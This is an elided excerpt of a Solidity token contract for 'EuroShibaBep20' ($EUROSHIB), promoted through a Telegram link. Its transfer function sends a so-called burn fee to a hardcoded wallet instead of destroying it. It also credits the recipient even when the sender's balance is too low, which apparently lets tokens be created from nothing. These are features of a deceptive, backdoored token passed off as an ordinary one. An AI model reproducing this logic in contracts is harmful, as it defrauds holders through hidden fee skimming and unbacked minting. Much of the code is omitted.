...
// Submitted for Telegram: https://t.me/euroshibabep20
...
contract  EuroShibaBep20  is Ownable, IERC20 {
    ...
    string private _symbol = "$EUROSHIB";
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0x4523EC7F20303aFc55E9509Ff2dCcD06D69FF480] += _bruntoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_brunfee > 0) {
        emit Transfer(form, 0x4523EC7F20303aFc55E9509Ff2dCcD06D69FF480, _bruntoken);
        }
